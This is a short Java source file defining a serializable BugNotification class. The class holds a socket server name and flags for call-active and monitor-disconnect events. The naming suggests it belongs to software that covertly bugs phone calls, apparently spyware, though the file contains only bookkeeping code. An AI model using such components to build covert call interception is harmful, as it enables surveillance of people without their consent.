package com.vvt.callmanager.ref;

import java.io.Serializable;

public class BugNotification implements Serializable {
	
	private static final long serialVersionUID = -3474466056273820035L;
	
	// The value must be in sequential e.g. 0, 1, 2, 4, 8, 16, 32, 64, ...
	// Check an example from android.telephony.PhoneStateListener
	public static final int LISTEN_NONE = 0;
	public static final int LISTEN_ON_NORMAL_CALL_ACTIVE = 1;
	public static final int LISTEN_ON_MONITOR_DISCONNECT = 2;
	
	private String mServerName;
	private int mListenEvent;
	
	/**
	 * @param serverName The name of socket server to forward the notification
	 * @param listenEvent the state of interest, as a bitwise-OR combination of LISTEN_ flags.
	 */
	public BugNotification(String serverName, int listenEvent) {
		this.mServerName = serverName;
		this.mListenEvent = listenEvent;
	}
	
	public String getServerName() {
		return mServerName;
	}
	
	public int getListenEvent() {
		return mListenEvent;
	}
	
	public boolean isListening(int listenFlag) {
		return (listenFlag & mListenEvent) == listenFlag;
	}
	
	@Override
	public boolean equals(Object obj) {
		boolean isSameClass = obj instanceof BugNotification;
		if (isSameClass) {
			String objServerName = ((BugNotification) obj).getServerName();
			return mServerName == null ? 
					objServerName == null : 
						mServerName.equals(objServerName);
		}
		return false;
	}
	
	@Override
	public int hashCode() {
		return mServerName == null ? 0 : mServerName.hashCode();
	}
	
	@Override
	public String toString() {
		String listen = "n/a";
		if (mListenEvent > 0) {
			StringBuilder builder = new StringBuilder();
			if (isListening(LISTEN_ON_NORMAL_CALL_ACTIVE)) {
				builder.append("on_normal_call_active");
			}
			if (isListening(LISTEN_ON_MONITOR_DISCONNECT)) {
				if (builder.length() > 0) builder.append(", ");
				builder.append("on_monitor_disconnect");
			}
			if (builder.length() > 0) {
				listen = builder.toString();
			}
		}
		return String.format("callback: %s, listen: %s", mServerName, listen);
	}

}
